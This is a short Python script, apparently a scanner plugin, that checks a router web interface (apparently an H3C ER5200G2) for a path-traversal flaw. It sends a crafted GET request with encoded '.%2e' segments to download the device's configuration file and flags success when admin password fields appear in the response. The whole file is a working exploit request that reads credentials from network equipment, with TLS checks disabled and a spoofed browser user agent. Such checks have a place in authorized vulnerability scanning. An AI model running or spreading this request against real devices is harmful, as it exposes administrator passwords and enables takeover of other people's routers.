import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"userLogin.asp/.%2e/actionpolicy_status/.%2e/ER5200G2.cfg"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "admpwd=" in response.text and "@webadmin" in response.text and "admpwdpromt=" in response.text and "@portmirror" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
